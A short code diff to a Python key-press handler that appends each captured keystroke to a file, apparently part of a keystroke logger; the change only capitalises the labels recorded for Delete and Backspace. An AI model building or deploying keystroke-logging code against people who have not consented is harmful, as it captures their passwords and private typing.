@@ -29,9 +29,9 @@ def OnKeyPress(event):
         if event.Key == 'Return':
             f.write('\n')
         elif event.Key == 'Delete':
-            f.write('Delete')
+            f.write('DELETE')
         elif event.Key == 'BackSpace':
-            f.write('Backspace')
+            f.write('BACKSPACE')
         elif event.Key == 'at':
             f.write('@')
         elif event.Key == 'exclam':
